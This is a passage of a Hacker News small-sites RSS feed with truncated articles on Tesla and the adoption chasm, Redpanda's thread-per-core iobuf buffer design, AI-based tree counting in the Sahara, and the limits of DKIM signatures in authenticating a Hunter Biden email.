<p>Not only do the requirements and values the buying community want change, new technology goes through a cycle, what Gartner calls its Hype Cycle. This is the recognition that innovation and change is often driven by the development of new technology which after an increase in market excitement and hype goes through a period where its position in the market. The early use cases and examples are often missing the mark or are beset with the realities of implementation, scale, cost or consumer acceptance. This causes the product to enter the trough of disillusionment while these shortcomings are resolved for the technology to then regroup and grow but with a more main stream and successful acceptance in the market.   
</p><p>These elements are related in many respects although the fundamentals behind them are different. Both however are relevant to Tesla and to a large extent EV adoption in general.
</p><h3>Buyer types and where the chasm appears.</h3><p>
The different buying communities are represented in chart below:
</p><p>
<img src="https://tesla-info.com/blog/chasm.png" alt="Buyers and the chasm">
</p><p>
From the chart we can see there are various classes of buyer type, but there is a significant gap in the path, moving across the early adopter category.  Innovators are driven by the latest technology and pushing new boundaries, their motivation is to be at the forefront, they take pleasure from the journey as much as the product, breaking new ground. The early adopters are slightly different, while accepting new technology ahead of the rest of society, they understand the product may not be fully developed or that there may be shortcoming in support and longevity but expecting the product to be first of a kind, relatively unique in the market place, and offering something different. They do this because they are driven by change, and potentially happy to take a degree of risk. Many of the owners driven by the environmental benefits would fall into this category.</p>
<p>Tesla have played to these buyer types, the 'beta' software plays to the values that innovators and early adopters desire. The bugs that occur in the frequent updates reinforce the idea that the products are experimental and leading edge. It's possible that Tesla are deliberately creating this notion that 'every owner is a beta tester' to increase the affinity and bonding with the brand by these early buyers as if owners are not just consumers but are active contributors to the development process. This sense of contribution also propagates itself through the official owners groups that run surveys to find out the extent of problems on behalf of Tesla when the information is readily available to Tesla directly.</p>
<p>But as we move from the tail end of the Early adopters into the Early majority the decision-making process changes again.  Completeness of the product becomes more important, reliability is a factor coupled with robust support, the items are simply expected to work and in a cost effective manner. They still like to adopt change early but their attitude to buying risk is different, they care about the reputation of the company, the supporting services need to be in place, and they are starting to become price sensitive, and in the lack of unique differentiation, they want value. The product needs to do what it says on the tin. They’re looking for degrees of familiarity, they’re not looking at significant change, new products need to add to their lives without taking anything away. </p>
<p>This is an area where Tesla are increasingly struggling with. For those with an arms-length relationship with Tesla, they still see the hype, the 0-60 times and the enthusiastic innovators who promote the product, but rarely take a rounded and objective view of the ownership proposition.</p>
<p>This is relevant to both Tesla and EV adoption. It's a bold step change to move away from the known for many buyers. You simply cannot map the activities of Petrol ownership to that of EV ownership. To substitute the 5 mins filling a petrol car with charging doesn't work. But this change in attitude is still change, and people are notorious for pushing back against it and have done with other perfectly good EVs.</p>
<p>The conundrum that other auto makers are facing is that while many produce EVs, both BMW and Nissan have been making very credible EVs for many years, they have not reached the same levels of attraction as Tesla. Some Tesla buyers don't even recognise these companies as having an EV product, instance dismissing BMW as being "years behind" when they've been making pure EVs for 6 years and in some respects have significantly more advanced technology with their carbon core chassis and a more environmentally friendly construction with a high % of recycled materials. So the question that presents itself is whether it is EVs that people are buying when they buy a Tesla, or is it something else that Tesla have created, and will it last as it transitions through the buyer groups. And secondly, will the ownership proposition of an EV catch out those looking to buy Tesla as a brand? In other words, the adoption of EV has been relatively slow across all the other brands and only Tesla seem to have broken free with volume sales. While there are a number of factors to this, such as the supercharging network, the ability to supply higher volumes, the range and the performance, the step change Tesla has over the competitors suggests owners are buying "Tesla" and not "EV".</p>

<h3>Hype cycle</h3>
<p>Gartner have mapped many new technologies against what they call the Hype Cycle. This illustrates the various stages of evolution from initial ideas, through an early spike of excitement and into a trough of disillusionment where many of the early ideas fail to deliver for a given class of innovation only to regroup and reappear at some point in the future or potentially become a minor technology. The emergence of block chain is a classic example of a technology innovation that continues to struggle with finding any real world applications despite going through a peak of excitement a few years ago.</p>
<p>EVs are now accelerating to the top of the Hype Cycle with every marketing campaign for cars mentioning EV or self-charging in some fashion. The consumer reality for new buyers is yet to be appreciated. Running an EV requires a different approach to vehicle management and costs are not cheap. Even if public charging infrastructure was better, the use of the infrastructure still requires a change in behaviour and the risk of delays when unexpected events enter people's lives and a one hour rapid charge is difficult to accommodate. </p>
<p>Its highly likely that EV technology will evolve rapidly and we will look back on these days with affection but also wonder what why we thought an hour supercharging for 180 range was good, but what's not clear is whether the broader public will fall out of love with EVs once some of the ownership aspects start to emerge and EVs will not gain mass appeal unless financially significantly attractive through government incentives, or the practicalities of ownership are made significantly easier. The average car own will not want to have to sign up and have an account with 10 different charging networks.</p>
<p>Both crossing the chasm and the hype cycle are models and for any given product or technology class, the exact path, pace and success will be different, but we believe the principles are worth considering. They often mirror each other, but both illustrate the difficulty in momentum and the change of mindset from the early stages of the lifecycle to the needs of the later stages.

</p><h2>The Tesla journey across the chasm</h2><p> 
To see the journey that Tesla customers need to make, we're going to look at three areas:
</p><ul>
<li>The buying experience</li>
<li>The ownership experience</li>
<li>The support experience</li>
</ul>
<h3>The buying experience</h3>
<p>Innovators loved the different sales technique. The lack of sales staff who don't have an incentive to sell, just to educate, enable test drives and if you wanted to buy, they'd either let you do it from home, or sit you down at a screen in store and let you fill out the form. The innovators were all over the internet forums and many knew more about the cars that the sales centre staff. They knew the details of a dual motor car over a single version, the usable battery capacity, and so on, and the experience with Tesla was almost collaborative rather than retailer/customer. It was a bold decision to buy a Tesla in the early days and part of the experience for the innovators and early adopters was working out the detail when they recognised few others did. It became a hobby to find out everything there was to know. </p>
<p>These early buyers set up fan sites, dismantled cars, bought into the green credentials, searched planning applications for where new chargers might be …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html">https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html</a></em></p>]]>
            </description>
            <link>https://tesla-info.com/blog/tesla-and-crossing-the-chasm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947398</guid>
            <pubDate>Fri, 30 Oct 2020 22:18:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amiga Boing Ball in WebGL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24947254">thread link</a>) | @doener
<br/>
October 30, 2020 | http://clb.confined.space/amiga/ | <a href="https://web.archive.org/web/*/http://clb.confined.space/amiga/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://clb.confined.space/amiga/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947254</guid>
            <pubDate>Fri, 30 Oct 2020 21:56:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thread-per-Core Buffer Management for a Modern Kafka-API Storage System]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947251">thread link</a>) | @fpina
<br/>
October 30, 2020 | https://vectorized.io/tpc-buffers/ | <a href="https://web.archive.org/web/*/https://vectorized.io/tpc-buffers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><div><div><main><section><p><a href="https://vectorized.io/redpanda-raison-detre">As I have previously observed</a>, software does not run on category theory, it runs on superscalar CPUs with wide, multi-channel GB/s memory units and NVMe SSD access times in the order of 10-100’s of microseconds. The reason some software written a decade ago - on a different hardware platform - feels slow is because it fails to exploit the advances in modern hardware.</p>
<p>The new bottleneck in storage systems is the CPU. SSD devices are 100-1000x faster than spinning disks and are 10x cheaper today[1] than they were a decade ago, from $2,500 down to $200 per Terabyte. Networks have 100x higher throughput in public clouds from 1Gbps to 100Gbps.</p>
<p>Although computers did, in fact, get faster, single-core speeds remain roughly the same. The reason being that CPU frequency has a cubic dependency on power consumption, and we’ve hit a wall. Instruction level parallelism, prefetching, speculative execution, branch prediction, deep hierarchy of data caches and instruction caches, etc, have contributed to programs <em>feeling</em> faster when you interact with them, but in the datacenter, the material improvements have come from the rise in core count. While the instructions per clock are 3x higher than a decade ago, core count is up 20x.</p>
<p>This is all to say that the rise of readily available, many-core systems necessitates a different approach for building infrastructure. Case in point[9]: in order to take full advantage of 96 vCPUs on a i3en.metal on AWS, you’ll need to find a way to exploit sustained CPU clock speed of 3.1 GHz, 60 TB of total NVMe instance storage, 768 GiB of memory and NVMe devices capable of delivering up to 2 million random IOPS at 4 KB block sizes. This kind of beast necessitates a new kind of storage engine and threading model that leverages these hardware advances.</p>
<p><a href="https://vectorized.io/tpc-buffers/vectorized.io/redpanda">Redpanda</a> - a Kafka-API compatible system for mission critical workloads[3] - addresses all of these issues. It uses a thread-per-core architecture with Structured Message Passing (SMP) to communicate between these pinned threads. Threading is a foundational decision for any application, whether you are using a thread-pool, pinned threads with a network of Single Producer Single Consumer SPSC[7] queues, or any other of the advanced Safe Memory Reclamation (SMR) techniques, threading is your ring-0, the true kernel of your application. It tells you what your sensitivity is for blocking - which for Redpanda is less than 500 microseconds - otherwise, Seastar’s[4] reactor will print a stack trace warning you of the blocking since it effectively injects latency on the network poller.</p>
<p>Once you have decided on your threading model, the next step is your memory model and ultimately, for storage engines, your buffer management. In this post, we’ll cover the perils of buffer management in a thread-per-core environment and describe <code>iobuf</code>, our solution for a 0-copy memory management in the world of Seastar.</p>
<h2 id="Request-Flow-Architecture">Request Flow Architecture<a href="#Request-Flow-Architecture" aria-label="Request Flow Architecture permalink"></a></h2>
<p>As mentioned earlier, Redpanda uses a <em>single</em> pinned thread per core architecture to do everything. Network polling, submitting async IO to the kernel, reaping events, triggering timers, scheduling compute tasks, etc. Structurally, it means nothing can block for longer than 500 microseconds, or you’ll be introducing latency in other parts of your stack. This is an incredibly strict programming paradigm, but this opinionated idea forces a truly asynchronous system, whether you like it or not as the programmer.</p>
<p><img src="https://vectorized.io/31d1a730c507b605e6c1ebea60eb1e56/flow.svg" alt="Kafka request flow">
<small>
Figure 1: request flow architecture. Core-0 accepts the connection from the Kafka Java client and becomes the source core. After the request goes through the metadata cache(valid request) it filters through the partition router which decides to send the request to core-1, the destination core. Core-1 then accepts the write through the Raft-log interface and saves it to disk.
</small></p>
<p>The challenge in a TpC (thread-per-core) architecture[8] is that all communication between cores is explicit. This muscles the programmer into implementing algorithms that favor core-locality (d-cache, i-cache) over the straightforward multi-threaded implementations via mutexes. This imperative has to be co-designed with the asynchronicity of a <strong>future&lt;&gt;</strong>-based implementation.</p>
<p>For our Kafka-API implementation as shown in Figure 1, we explicitly trade memory usage to reduce latency and increase throughput by materializing key components. The metadata Cache is materialized on every core since every request has to know if the partition exists, and that that particular machine is, in fact, the leader of the partition. The Partition Router maintains a map of which logical core actually owns the underlying Kafka partition on the machine. Other things like Access Control Lists (ACLs) are deferred until the request reaches the destination core since they can get unwieldy in memory footprint.  We have no hard and fast rule of what we materialize on every core vs. what is deferred for the destination core, and it’s often a function of memory (smaller data structures are good candidates for broadcast), computation (how much time is spent deciding) and frequency of access (very likely operations tend to get materialized on every core).</p>
<p>One question remaining is how, exactly, does memory management work in a TpC architecture? How does data actually travel from L-core-0 to L-core-66 safely using a network of SPSC queues within a fully asynchronous execution model where things can suspend at any point in time?</p>
<h2 id="struct-iobuf--">struct iobuf { };<a href="#struct-iobuf--" aria-label="struct iobuf   permalink"></a></h2>
<h3 id="Redpandas-0-copy-buffer-management-for-TpC">Redpanda’s 0-copy buffer management for TpC<a href="#Redpandas-0-copy-buffer-management-for-TpC" aria-label="Redpandas 0 copy buffer management for TpC permalink"></a></h3>
<p>To understand <strong>iobuf</strong>, we need to understand the actual memory constraints of Seastar, our TpC framework. During program bootstrap, Seastar allocates the full memory of the computer and splits it evenly across all the cores. It consults the hardware to understand what memory belongs to each particular core, reducing inter-core traffic to main memory.</p>
<p><img src="https://vectorized.io/efa273909c5b695bf7f978f77b32c12b/seastar_model.svg" alt="Seastar mental model">
<small>
Figure 2: Copy from alexgallego.org (<a href="https://www.alexgallego.org/concurrency/smf/2017/12/16/future.html" target="_self" rel="nofollow">https://www.alexgallego.org/concurrency/smf/2017/12/16/future.html</a>) Seastar threading model. Seastar uses a network of SPS queues to send messages to neighboring cores. Similar to other message passing or actor models like Erlang, Orleans and Pony, once a function is futurized, transitive functions too will become futurized. Both approaches, however, are intrinsically safe. The programmer worries about correctness and construction while the frameworks worry about efficient execution. Counter to general wisdom, it is actually faster and more scalable than the synchronous approach. While the machine does more work, it is executing your code simultaneously. This simultaneity is the key to finishing work sooner.
</small></p>
<p>As Figure 2 suggests, memory allocated on core-0, <em>must</em> be deallocated on core-0. However, there is no way to guarantee that a Java or Go client connecting to Redpanda will actually communicate with the exact core that owns the data.</p>
<p>At its core, an iobuf is a ref-counted, fragmented-buffer-chain with deferred deletes that allows Redpanda to simply share a view of a remote core’s parsed messages as the fragments come in, without incurring a copy overhead.</p>
<p><img src="https://vectorized.io/6df6fc00e05201d068dc5d03e080606a/iobuf.svg" alt="iobuf architecture"></p>
<p>The fragmented buffers abstraction is not new. The linux kernel has <strong>sk_buff</strong>[5] and the freebsd kernel has an <strong>mbuf</strong>[6] which are roughly similar. The additional extension of an iobuf is that it works in the TCP model leveraging Seastar’s network of SPSC queues to have proper deletes in addition to being able to share sub-views arbitrarily, tailored for a storage-like workload.</p>
<p>Removing the C++ templates, allocators, pooling, pointer caching, etc, one could think of an iobuf as being equivalent to:</p>
<div data-language="cpp"><pre><code><span>struct</span> <span>fragment</span> <span>{</span>
    <span>void</span> <span>*</span> data<span>;</span>
    size_t ref_count<span>;</span>
    size_t capacity<span>;</span>
    size_t size<span>;</span>

    fragment<span>*</span> next<span>;</span>  
    fragment<span>*</span> prev<span>;</span>
<span>}</span>
<span>struct</span> <span>iobuf</span> <span>{</span>
    fragment<span>*</span> head<span>;</span>
<span>}</span><span>;</span></code></pre></div>
<p>The origins of iobuf are rooted in one of our central product tenets for building a Kafka® replacement for mission critical systems - giving users 10x lower tail latencies for most workloads. Aside from a thread-per-core architecture, the memory management would have been our second bottleneck if not designed from the ground up for latency. On long running storage systems, memory fragmentation is a real problem, and one that is eventually either met with a proper solution (iobuf), stalls or an OOM.</p>
<p>Like its predecessors skbuff and mbuff, iobuf allows us to optimize and train our memory allocator with predictable memory sizes. Here is our iobuf allocation table logic:</p>
<div data-language="cpp"><pre><code><span>struct</span> <span>io_allocation_size</span> <span>{</span>
   <span>static</span> <span>constexpr</span> size_t max_chunk_size <span>=</span> <span>128</span> <span>*</span> <span>1024</span><span>;</span>
   <span>static</span> <span>constexpr</span> size_t default_chunk_size <span>=</span> <span>512</span><span>;</span>

   
   
   
   
   
   
   <span>static</span> <span>constexpr</span> std<span>::</span>array<span>&lt;</span><span>uint32_t</span><span>,</span> <span>15</span><span>&gt;</span> alloc_table <span>=</span>
     
     <span>{</span><span>{</span><span>512</span><span>,</span>
       <span>768</span><span>,</span>
       <span>1152</span><span>,</span>
       <span>1728</span><span>,</span>
       <span>2592</span><span>,</span>
       <span>3888</span><span>,</span>
       <span>5832</span><span>,</span>
       <span>8748</span><span>,</span>
       <span>13122</span><span>,</span>
       <span>19683</span><span>,</span>
       <span>29525</span><span>,</span>
       <span>44288</span><span>,</span>
       <span>66432</span><span>,</span>
       <span>99648</span><span>,</span>
       <span>131072</span><span>}</span><span>}</span><span>;</span>

   <span>static</span> size_t <span>next_allocation_size</span><span>(</span>size_t data_size<span>)</span><span>;</span>
<span>}</span><span>;</span>   </code></pre></div>
<p>Predictability, memory pooling, fixed sizes, size capping, fragmented traversal, etc, are all known techniques to reduce latency. Asking for contiguous and variably sized memory could cause the allocator to compact all of the arenas and reshuffle a lot of bytes for what could be a short-lived request, not only injecting latency on the request path, but for the entire system since we have exactly one thread performing all operations.</p>
<p>Hardware is the platform. When we ask the network layer to give us exactly 11225 bytes in contiguous memory, we are simply asking the allocator to linearize an empty buffer of that exact size and for the network layer to copy bytes as the fragments come from the hardware into the destination buffer. There is ultimately no free lunch when it comes to trying to squeeze every single ounce of performance of your hardware and often it requires re-architecting from zero.</p>
<p>If you made it this far, I encourage you to sign up for our <a href="https://vectorized.io/slack" target="_self" rel="nofollow">Community Slack (here!)</a> and ask us questions directly or engage with us on twitter via <a href="https://twitter.com/vectorizedio" target="_self" rel="nofollow">@vectorize…</a></p></section></main></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vectorized.io/tpc-buffers/">https://vectorized.io/tpc-buffers/</a></em></p>]]>
            </description>
            <link>https://vectorized.io/tpc-buffers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947251</guid>
            <pubDate>Fri, 30 Oct 2020 21:56:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Artificial intelligence reveals hundreds of millions of trees in the Sahara]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947022">thread link</a>) | @rbanffy
<br/>
October 30, 2020 | https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/ | <a href="https://web.archive.org/web/*/https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-area">
        <div>
          <!-- Content with right menu -->

<div>
  
    





  

	<p>
		20 October 2020
	</p>

	


	<div>
		<p><span>TREES</span></p><p>There are far more trees in the West African Sahara and Sahel than most would expect. A combination of artificial intelligence and detailed satellite imagery allowed a team from the University of Copenhagen and international collaborators to count all trees across a 1.3 million km2 area of West Africa. 
</p>
	</div> 
		<figure>
			<img alt="Dryland landscape in Africa" src="https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/billedinformationer/Sahara_1100x600.jpg" title="Dryland landscape in Africa">
			<figcaption>Photo: Martin Brandt</figcaption>
		</figure>

	<p>If you think that the Sahara is covered only by golden dunes and scorched rocks, you aren’t alone. Perhaps it's time to shelve that notion. In an area of West Africa 30 times larger than Denmark, an international team, led by University of Copenhagen and NASA researchers, has counted over 1.8 billion trees and shrubs. The 1.3 million km<sup>2</sup> area covers the western-most portion of the Sahara Desert, the Sahel and what are known as sub-humid zones of West Africa.</p>
<p>"We were very surprised to see that quite a few trees actually grow in the Sahara Desert, because up until now, most people thought that virtually none existed. We counted hundreds of millions of trees in the desert alone. Doing so wouldn't have been possible without this technology. Indeed, I think it marks the beginning of a new scientific era," asserts Assistant Professor Martin Brandt of the University of Copenhagen’s Department of Geosciences and Natural Resource Management, lead author of <a href="https://www.nature.com/articles/s41586-020-2824-5">the study’s scientific article, now published in <em>Nature</em></a>.</p>
<p>The work was achieved through a combination of detailed satellite imagery provided by NASA, and deep learning — an advanced artificial intelligence method. Normal satellite imagery is unable to identify individual trees, they remain literally invisible. Moreover, &nbsp;a limited interest in counting trees outside of forested areas led to the prevailing view that there were almost no trees in this particular region. This is the first time that trees across a large dryland region have been counted.</p>
<h2>The role of trees in the global carbon budget</h2>
<p>New knowledge about trees in dryland areas like this is important for several reasons, according to Martin Brandt. For example, they represent an unknown factor when it comes to the global carbon budget:</p>
<p>"Trees outside of forested areas are usually not included in climate models, and we know very little about their carbon stocks. They are basically a white spot on maps and an unknown component in the global carbon cycle," explains Martin Brandt.</p>
<p>Furthermore, the new study can contribute to better understanding the importance of trees for biodiversity and ecosystems and for the people living in these areas. In particular, enhanced knowledge about trees is also important for developing programmes that promote agroforestry, which plays a major environmental and socio-economic role in arid regions.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>"Thus, we are also interested in using satellites to determine tree species, as tree types are significant in relation to their value to local populations who use wood resources as part of their livelihoods. Trees and their fruit are consumed by both livestock and humans, and when preserved in the fields, trees have a positive effect on crop yields because they improve the balance of water and nutrients," explains Professor Rasmus Fensholt of the Department of Geosciences and Natural Resource Management.</p>

<figure><img alt="The area where the trees were mapped" src="https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/billedinformationer/West_Africa_study_area_1100x600.jpg" title="The red rectangle marks the area where the trees were mapped">
<figcaption>The red rectangle marks the area where the trees were mapped.</figcaption>
</figure>

<h2>Technology with a high potential</h2>
<p>The research was conducted in collaboration with the University of Copenhagen’s Department of Computer Science, where researchers developed the deep learning algorithm that made the counting of trees over such a large area possible.</p>
<p>The researchers show the deep learning model what a tree looks like: They do so by feeding it thousands of images of various trees. Based upon the recognition of tree shapes, the model can then automatically identify and map trees over large areas and thousands of images. The model needs only hours what would take thousands of humans several years to achieve.</p>
<p>"This technology has enormous potential when it comes to documenting changes on a global scale and ultimately, in contributing towards global climate goals. It is a motivation for us to develop this type of beneficial artificial intelligence," says professor and co-author Christian Igel of the Department of Computer Science.</p>
<p>The next step is to expand the count to a much larger area in Africa. And in the longer term, the aim is to create a global database of all trees growing outside forest areas.</p>





  

</div>
<div>

  
    
    
        	

	


        <div>
    <p>
        <h2>Fakta</h2>
    </p>
    <div>
        <ul>
<li>The researchers counted 1.8 billion trees and shrubs with crowns larger than 3 m<sup>2</sup>. Thus, the actual number of trees in the area is even higher.</li>
<li>Deep learning can be characterized as an advanced artificial intelligence method where an algorithm is trained to recognize specific patterns in large amounts of data. The algorithm used in this research was trained using nearly 90,000 images of different trees across a variety of landscapes. </li>
<li><a href="https://www.nature.com/articles/s41586-020-2824-5">The scientific article for this study is published in the renowned journal Nature.</a> </li>
<li>The research was carried out by researchers from the University of Copenhagen; NASA Goddard Space Flight Center, USA; HCI Group, University of Bremen, Germany; Université Paul Sabatier, France; Pastoralisme Conseil, France; Centre de Suivi Ecologique, Senegal; Geosciences Environnement Toulouse (GET), France; Ecole Normale Supérieure, France; Université Catholique de Louvain, Belgium.</li>
<li>The research is supported, among others, The AXA Research Fund (postdoctoral programme); Independent Research Fund Denmark - Sapere Aude; Villum Foundation and the European Research Council (ERC) under the EU's Horizon 2020 Programme.</li>
</ul>

    </div>
</div>






  
</div>

        </div>
      </div></div>]]>
            </description>
            <link>https://www.science.ku.dk/english/press/news/2020/artificial-intelligence-reveals-hundreds-of-millions-of-trees-in-the-sahara/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947022</guid>
            <pubDate>Fri, 30 Oct 2020 21:22:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Draw Your Own Conclusions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946813">thread link</a>) | @jaxxstorm
<br/>
October 30, 2020 | https://leebriggs.co.uk/blog/2020/10/29/draw-your-own-conclusions.html | <a href="https://web.archive.org/web/*/https://leebriggs.co.uk/blog/2020/10/29/draw-your-own-conclusions.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
<p>The year is 2020, and the US election is a matter of days away. While the world deals with an unprecedented pandemic and Americans on both sides of the aisle fight for what they believe to be the very soul of their nation, conservative media is in a frenzy about a laptop that contains emails from <a href="https://en.wikipedia.org/wiki/Hunter_Biden">Hunter Biden</a>, which has been procured by <a href="https://en.wikipedia.org/wiki/Rudy_Giuliani">Rudy Giuliani</a>, who was named President Donald Trump’s <a href="https://www.washingtonpost.com/news/powerpost/wp/2017/01/12/trump-names-rudy-giuliani-as-cybersecurity-adviser/">cybersecurity expert</a> in 2017.</p>
<p>Now, anyone who has previously read this blog will wonder why on earth I’m writing about this topic. To be quite honest, it’s past 10pm on a Thursday evening and I’m sort of wondering why myself. However, I saw a set of tweets in my timeline which raised my eyebrows. Here’s the first tweet in the thread:</p>
<blockquote><p lang="en" dir="ltr">So as I blogged before, the emails contained DKIM information, which the original reporters could and should have verified. So I eventually got a copy of the email and run DKIM verification on it. It passed: <a href="https://t.co/HVjOlMq7QV">https://t.co/HVjOlMq7QV</a></p>— Robᵉʳᵗ Graham😷, provocateur (@ErrataRob) <a href="https://twitter.com/ErrataRob/status/1322007153415200768?ref_src=twsrc%5Etfw">October 30, 2020</a></blockquote>

<p>To provide some context, the Daily Caller (a news organization founded by <a href="https://en.wikipedia.org/wiki/Tucker_Carlson">Tucker Carlson</a> among others) have printed a story on their website in which they cite evidence from Rob Graham, a well respected Information Security researcher (who is has written powerful and widely used tools). Rob has gone out of his way to retrieve a copy of an email from the Hunter Biden “laptop from hell” and verified the <a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DKIM signature</a> of one of the most damning emails.</p>
<p>To quote the Daily Caller, this information <em>authenticates</em> these emails. Here is the exact quote (<a href="https://web.archive.org/web/20201030052504/https://dailycaller.com/2020/10/29/cybersecurity-expert-authenticates-hunter-biden-burisma-email/">at the time of writing</a>) from the Daily Caller article:</p>
<p><em>Graham, who has been cited as a cybersecurity expert in The Washington Post, the Associated Press, Wired, Engadget and other news and technology outlets, told the DCNF that he used a cryptographic signature found in the email’s metadata to validate that Vadym Pozharsky, an advisor to Burisma’s board of directors, emailed Hunter Biden on April 17, 2015.</em></p>
<p>Before I examine this particular claim, I’d like to assert that I am not an internet security researcher that has been cited in the Washington Post like Rob. I do, however, have a fairly good understanding of how email, DKIM, the internet and computers in general work.</p>
<p>I can say with a very high degree of certainty that the quote from the article is spurious at best, and utter horseshit at worst. It is impossible to verify that Vadym Pozharsky sent that email from a DKIM signature alone.</p>
<h2 id="lets-talk-about-email">Let’s talk about email</h2>
<p>Anyone with even a passing interest in IT and computers may have heard that email is insecure by design. At its very core, email was designed to send communications between people in plaintext, and every attempt to secure it since its conception has been a bolted on attempt to try and fix it, with varying degrees of success.</p>
<p>There’s a reason you get so much spam in your inbox, and it’s the same reason you get told by people at your employer not to click on links in emails you don’t trust. To provide a non-exhaustive list:</p>
<ul>
<li>It’s very easy to forge the <code>from:</code> field of an email address</li>
<li>It’s possible to intercept an email and read its content without a whole lot of legwork</li>
<li>Email providers are notoriously lax with who they allow to create accounts</li>
</ul>
<p>DKIM was created in 2011 to try and attempt to stop some of the issues around the above issues, with varying degrees of success.</p>
<h2 id="what-the-fuck-is-dkim">What the fuck is DKIM?</h2>
<p>DKIM is an email enhancement which is designed to prevent the forging of sender addresses in email. It works by using <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">Public-key cryptography</a> to “sign” emails when they are sent.</p>
<p>When you send an email with DKIM enabled, it’s signed by a private key which is held by your outbound mail server (although, not exclusively, but that’s beyond the scope of this article). When this happens, your email server embeds an <a href="https://en.wikipedia.org/wiki/Email#Header_fields">email header</a> into the outgoing email, with key information such as who the sender is, and the location of the public key used in the keypair which signed the email. This information can be used to verify the email’s origin.</p>
<p>Many of the large email providers enable DKIM by default on outbound mail, because it works wonders in preventing spam originating from their domains. It’s for this reason that spammers will often try and hijack the credentials for your email accounts and use them as part of their spam bots - getting access to a valid account on a respected email provider with DKIM enabled will almost always bypass any spam protection the recpient has enabled.</p>
<p>Knowing this information, we can make some very strong assertions from the email (which is available <a href="https://github.com/robertdavidgraham/hunter-dkim/blob/main/Meeting%20for%20coffee.eml">here</a> with the DKIM header included).</p>
<h3 id="what-we-can-verify">What we can verify</h3>
<p>Rob did the heavy lifting for us. The email contains a DKIM signature and Rob verified that the signature was valid:</p>
<blockquote><p lang="en" dir="ltr">So you search the Internet for "TXT 20120113._domainkey.gmail.com" and you'll find lots of answers what the key was 6 years ago:<a href="https://t.co/eK6kHNd9Mn">https://t.co/eK6kHNd9Mn</a></p>— Robᵉʳᵗ Graham😷, provocateur (@ErrataRob) <a href="https://twitter.com/ErrataRob/status/1322009696149164032?ref_src=twsrc%5Etfw">October 30, 2020</a></blockquote>

<p>We can say with a very high degree of certainty that the email linked above originated from a <em>genuine google email address</em>. The address the email came from is <code><a href="https://leebriggs.co.uk/cdn-cgi/l/email-protection" data-cfemail="1a6c346a7560727b6869716373346f71687b73747f5a7d777b737634797577">[email&nbsp;protected]</a></code> and if we consider the definition of <em>authentic</em> that we can verify the emails’ origin, we could arguably say that this email is <em>authentic</em>.</p>
<p>However, if we recall the original article from the Daily Caller, they didn’t just claim the email is authentic, they actually said this:</p>
<p><em>…told the DCNF that he used a cryptographic signature found in the email’s metadata to validate that Vadym Pozharsky, an advisor to Burisma’s board of directors, emailed Hunter Biden on April 17, 2015.</em></p>
<h3 id="what-we-cannot-verify">What we cannot verify</h3>
<p>Here’s the problem with this whole affair. There is absolutely no way, at all, to verify that Vadym Pozharskyi is the owner or has access to the <code><a href="https://leebriggs.co.uk/cdn-cgi/l/email-protection" data-cfemail="abdd85dbc4d1c3cad9d8c0d2c285dec0d9cac2c5ceebccc6cac2c785c8c4c6">[email&nbsp;protected]</a></code> email address. It’s possible that he is the owner. Some people reading this might even say it’s <em>likely</em> he’s the owner of that account. Information may come to light after I publish this post that it is factually correct that Vadym Pozharskyi owns this email address.</p>
<p>What I have a considerable problem with here is that Rob Graham, a well respected security researcher, is being quoted in a popular website as claiming that DKIM <em>proves</em> that Vadym Pozharskyi sent this email.</p>
<p>If you quickly scroll back to my list of reasons email isn’t secure, you’ll notice that I make the assertion that anyone can register an email account with Google. In fact, I registered one in seconds:</p>
<p><img src="https://i.ibb.co/Wn7cYRh/Elj-Pm-j-Vo-AA9gl-A.jpg" alt=""></p>
<p>Again, I cannot claim that this email is <em>not</em> from Vadym Pozharskyi, but I also know that Rob Graham knows that the information being spread by the Daily Caller cannot be verified to back up the claims they’re making from a DKIM signature, and it is dishonest to claim otherwise.</p>
<h2 id="draw-your-own-conclusions">Draw your own conclusions</h2>
<p>I have a high degree of respect for Rob, despite the fact I don’t agree with his political opinions. What has begun to frustrate me more than anything about discourse in the 21st century is the tendency to provide only enough information to support your argument, and omit vital pieces of information. With that in mind, I’d like to finish this post with a couple of extra pieces of information you might consider:</p>
<ul>
<li><a href="https://noxxi.de/research/breaking-dkim-on-purpose-and-by-chance.html#spoofed_body_dhl">DKIM is not a flawless protocol</a>, and can be spoofed</li>
